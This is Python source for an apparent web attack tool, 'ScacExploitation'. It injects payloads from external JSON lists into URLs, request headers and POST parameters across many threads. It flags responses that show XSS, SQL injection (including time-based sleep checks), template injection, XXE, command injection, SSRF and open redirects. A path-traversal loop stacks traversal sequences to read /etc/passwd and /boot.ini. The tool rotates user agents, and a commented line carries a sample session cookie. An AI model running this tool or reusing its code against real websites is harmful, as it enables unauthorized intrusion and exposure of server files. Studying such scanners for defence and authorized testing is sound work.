import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import time, sleep
import random, os, re, json
from urllib.parse import urljoin, urlparse
from urllib.error import HTTPError, URLError
from colorama import Fore
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem


class ScacExploitation:
    def __init__(self,thread,delay,verbose, urlList = "json/resultPath.json", allJson = "json/vulnList/all.json", cookie = None):
        self.allJson = json.loads(open(allJson).read())
        self.allJsonKeys = list(self.allJson.keys())
        self.urlList = json.loads(open(urlList).read())
        self.verbose = verbose
        self.cookie = cookie
        self.delay = delay
        self.thread = thread
        self.result = []
        self.firstRequest = None
        self.firstRequestContent = None
        self.count = 0
        self.info()
    def info(self):
        text =  "We are now ready to exploit."
        str = ""
        if self.verbose == True:
            for x in text :
                str += x
                print('{}\r'.format(str),end="")
                sleep(random.uniform(0.01, 0.1))
            print()
        self.threadingFunction()
    def randomAgent(self):
        software_names = [SoftwareName.CHROME.value,SoftwareName.FIREFOX.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value] 
        user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
        return user_agent_rotator.get_random_user_agent()


    def controller(self, key, secondRequest, inj, second, secondRequestContent):
        secondRequest = json.loads(secondRequest)
        def contentController():
            if secondRequest['status_code'] != 404 :
                if key == "xss":
                    if "<h1>say hello to SCAC</h1>".lower() in str(secondRequestContent).lower():
                        self.result.append(secondRequest['url'])
                        return True
                        
                elif key == 'sql':
                    if 'sleep' in inj:
                        for i in range(5,10):
                            if second == i:
                                self.result.append(secondRequest['url'])
                                return True
                    else:
                        messages =  [
                            'SQL syntax',
                            'Unclosed quotation',
                            'quoted string',
                            'could not connect to server',
                            'psql',
                            'Undefined variable',
                        ]
                        for i in messages:
                            if i.lower() in str(secondRequestContent).lower():
                                self.result.append(secondRequest['url'])
                                return True
                    
                elif key == 'pathTraversal' or key == 'xxe' or key == "commandInjection":
                    
                    if "root:x:0:0:root" in str(secondRequestContent).lower() or "XML parser".lower() in str(secondRequestContent).lower() or "boot loader" in str(secondRequestContent).lower():
                        self.result.append(secondRequest['url'])
                        return True

                elif key == 'graphQL':
                    if 'Syntax Error'.lower() in str(secondRequestContent).lower():
                        self.result.append(secondRequest['url'])
                        return True

                elif key == 'templateInjection':
                    if 'say hello to SCAC' in str(secondRequestContent) or '39483' in str(secondRequestContent):
                        self.result.append(secondRequest['url'])
                        return True

                elif key == 'SSRF' or key == 'URLredirection':
                    for i in range(300,400):
                        if int(secondRequest['status_code']) == i:
                            self.result.append(secondRequest['url'])
                            return True
                
                
        if contentController(): return True
        else: return False

    def scanner(self,data):
        self.secondRequest = None
        self.secondRequestContent = None
        url = data[0] # url
        inj = data[1] # payload
        injType = data[2] # payload type
        headerList = [
            'Host',
            'User-Agent',
            'Cookie'
        ]
        def requestSender():
            # first injected url
            def firstInjected():
                r = requests.get(url+inj, headers={'Cookie': self.cookie})
                #print("normaly injection" + r.url)
                self.secondRequest = {}
                self.secondRequest['url'] = r.url
                self.secondRequest['status_code'] = r.status_code
                self.secondRequest['content_lengt'] = len(r.text)
                self.secondRequestContent = r.content
                self.secondRequest = json.dumps(self.secondRequest)
                #print(injType)
                if self.controller(key=injType,secondRequest=self.secondRequest, inj=inj,second=None, secondRequestContent= self.secondRequestContent):  
                    print(Fore.GREEN + "[+]",Fore.LIGHTGREEN_EX, url, Fore.LIGHTRED_EX+inj)
                self.count += 1
            # for Path traversal

            #print('Burada')
            def pathTraversal():
                if injType == "pathTraversal":
                    etcAndBoot = [
                        "/etc/passwd",
                        "/boot.ini"
                    ]
                    for i in range(1,16):
                        for x in etcAndBoot:
                            r = requests.get(url+inj*i+x,headers={'Cookie': self.cookie})
                            if self.verbose: print(Fore.CYAN + url + Fore.MAGENTA+"\tPayload: "+ Fore.LIGHTRED_EX + inj*i+x)
                            self.secondRequest = {}
                            self.secondRequest['url'] = r.url
                            self.secondRequest['status_code'] = r.status_code
                            self.secondRequest['content_lengt'] = len(r.text)
                            self.secondRequestContent = r.content
                            self.secondRequest = json.dumps(self.secondRequest)
                            if self.controller(injType,self.secondRequest,inj,None,self.secondRequestContent):
                                print(Fore.GREEN + "[+]",Fore.LIGHTGREEN_EX, url, Fore.LIGHTRED_EX+inj)
                            self.count += 1
            
              
            # with Header Ä°njection
            def headerInjection():
                for key in headerList:
                    
                    now = time()
                    r = requests.get(url,headers={key:inj,'Cookie': self.cookie})
                    seconds = int(now % 60)
                    if self.verbose: print(Fore.CYAN + url + Fore.MAGENTA+"\tHeader: "+ Fore.LIGHTRED_EX + key + " ~ " + Fore.MAGENTA+"Payload: "+ Fore.LIGHTRED_EX + inj)
                    self.secondRequest = {}
                    self.secondRequest['url'] = r.url
                    self.secondRequest['status_code'] = r.status_code
                    self.secondRequest['content_lengt'] = len(r.text)
                    self.secondRequestContent = r.content
                    self.secondRequest = json.dumps(self.secondRequest)
                    if self.controller(injType,self.secondRequest, inj, seconds, self.secondRequestContent):
                        print(Fore.GREEN + "[+]",Fore.LIGHTGREEN_EX, url, Fore.LIGHTRED_EX+inj)
                    self.count += 1
                    now = None
                    self.secondRequest = None
  
            # with Post injection

            firstInjected()
            pathTraversal()
            headerInjection()
        requestSender()
    def postInjection(self, data):
        self.secondRequest = None
        self.secondRequestContent = None
        url = data[0] # url
        inj = data[1] # payload 
        injType = data[2] # payload type
        self.secondRequest = None

        # data = {
        #     'productId': inj,
        #     'storeId': inj
        # }
        
        path = url.split('?')[1].split('=')
        datas = {}
        count = 0
            
        
        for data in path:
            if "&" in data:
                key = data.split('&')
                datas[key[1]] = inj
                count += 1
            else:
                if count == 0 :
                    datas[data] = inj
                    count += 1
        datas = json.dumps(datas)
        count = 0
            
        # datas2 = ""
        # for data in path:
        #     if "&" in data:
        #         key = data.split('&')
        #         datas2 += "&"+key[1]+ "=" +inj
        #         count += 1
        #     else:
        #         if count == 0 :
        #             datas2 += "?"+data+ "=" + inj
        #             count += 1
        domain =  "://".join([urlparse(url).scheme,urlparse(url).netloc])+urlparse(url).path
        
        if not self.cookie:
            now = time()
            s = requests.session()
            r = s.request(method='POST',url = domain, headers={'User-Agent': self.randomAgent()}, data=datas)
            seconds = int(now % 60)
        else:
            now = time()
            r = requests.post(domain, headers={'User-Agent': self.randomAgent(),'Cookie': self.cookie}, data=datas)
            seconds = int(now % 60)

        if self.verbose:  print(Fore.CYAN + url + Fore.MAGENTA+"\tPost Qery: "+ Fore.LIGHTRED_EX + ' scacHere'+ " ~ " + Fore.MAGENTA+"Payload: "+ Fore.LIGHTRED_EX + inj)
        self.secondRequest = {}
        self.secondRequest['url'] = r.url
        self.secondRequest['status_code'] = r.status_code
        self.secondRequest['content_lengt'] = len(r.text)
        self.secondRequestContent = r.content
        self.secondRequest = json.dumps(self.secondRequest)
        if self.controller(injType,self.secondRequest, inj, seconds, self.secondRequestContent):
            print(Fore.GREEN + "[+]  "+ url + Fore.MAGENTA+"\tPost Qery: "+ Fore.LIGHTRED_EX + urljoin(url).path)
        self.count += 1
        now = None

    def choice(self,data):
        if data[-1] == "GET" or data[-1] == "POST":
            #print(data)
            self.scanner([data[0],data[1],data[2]])

    def firstReq(self,url):
        self.firstRequest = None
        r = requests.post(url, headers={'User-Agent': self.randomAgent()})
        self.firstRequest = {}
        self.firstRequest['status_code'] = r.status_code
        self.firstRequest['content_lengt'] = len(r.text)
        self.firstRequestContent = r.content
        self.firstRequest = json.dumps(self.firstRequest)
        
        
    def threadingFunction(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            for url in self.urlList['result']:
                
                self.firstReq(url)
                for keys in self.allJsonKeys:
                    for inj in self.allJson[keys]:
                        if self.count % self.thread == 0 and self.count > 0: 
                            # [url,inj,injType],path
                            if '?' in url:
                                self.postInjection([url,inj,keys])
                            executor.submit(self.choice, [url,inj,keys , "GET"])
                            print(Fore.YELLOW + f"{str(self.delay)} Seconds sleep" )
                            sleep(self.delay)
                            self.count += 1
                        else: 
                            executor.submit(self.choice, [url,inj,keys , "GET"])
                            self.count += 1
                    # for inj in list(keys):
                    #     if self.count % self.thread == 0 and self.count > 0: 
                    #         executor.submit(self.choice, [url,inj,keys , "POST"])
                    #         sleep(self.delay)
                    #         self.count += 1
                    #     else: 
                    #         executor.submit(self.choice, [url,inj,keys , "POST"])
                    #         self.count += 1
                self.firstRequest = None

# if __name__ == "__main__":
#     sc = ScacExploitation(thread=30, delay=5, verbose=False, cookie="session=v6s8YrwJep7PPy9JoM3kuehpYnBClvvJ")
#     sc.threadingFunction()